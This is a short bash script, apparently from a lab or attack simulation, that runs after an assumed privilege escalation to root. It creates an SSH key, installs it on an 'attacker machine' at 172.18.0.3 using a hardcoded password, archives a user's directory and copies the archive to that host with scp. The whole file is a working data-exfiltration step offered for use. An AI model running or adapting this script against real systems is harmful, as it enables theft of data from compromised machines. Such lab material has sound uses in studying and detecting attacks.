#!/bin/bash

# Run PEexploit.sh located at /home/resch to ensure that privilege escalation has happened and the current user is root

# manual steps
# /home/resch/.scripts/exfiltration_target.sh

# Generate SSH key pair and copy it to the attacker machine:
ssh-keygen -t rsa -f /root/.ssh/id_rsa_Cserver -N ""
chmod 400 /root/.ssh/id_rsa_Cserver.pub
sshpass -p "vagrant" ssh-copy-id -i /root/.ssh/id_rsa_Cserver.pub vagrant@172.18.0.3

# Generate some example files and tar them so that the .tar.gz file can be exfiltrated
# mkdir -p /root/test/stuff
# cd /root/test/stuff
# echo "owuoqwdjhoasjdo" > test1.txt
# echo "sadasdcasdac" > test2.txt
# echo "owuoqwdjhasdadasdasoasjdo" > test3.txt
# echo "owuoqasdacdsacdsadscadscadsacdwdjhoasjdo" > test4.txt

cd /home/resch/destination
touch exfiltrate_backups.tar.gz
tar --exclude=exfiltrate_backups.tar.gz -zcf exfiltrate_backups.tar.gz .

cd /home/resch/.ssh

# Send the tar file to attacker using scp
scp -i /root/.ssh/id_rsa_Cserver /home/resch/destination/exfiltrate_backups.tar.gz vagrant@172.18.0.3:/home/vagrant/exfiltrated/